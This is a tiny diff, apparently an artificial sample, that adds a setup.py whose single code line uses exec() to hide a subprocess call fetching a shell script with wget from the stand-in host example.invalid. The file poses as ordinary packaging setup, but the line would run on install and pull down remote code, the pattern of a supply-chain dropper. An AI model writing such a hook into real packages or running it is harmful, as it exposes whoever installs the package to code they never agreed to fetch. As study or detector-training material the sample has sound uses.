@@ -1,0 +1,5 @@
+# path: setup.py
+# lines: 1
+# weight: 35
+# ---
+exec("import subprocess\nsubprocess.run(['wget', 'example.invalid/x.sh'])")
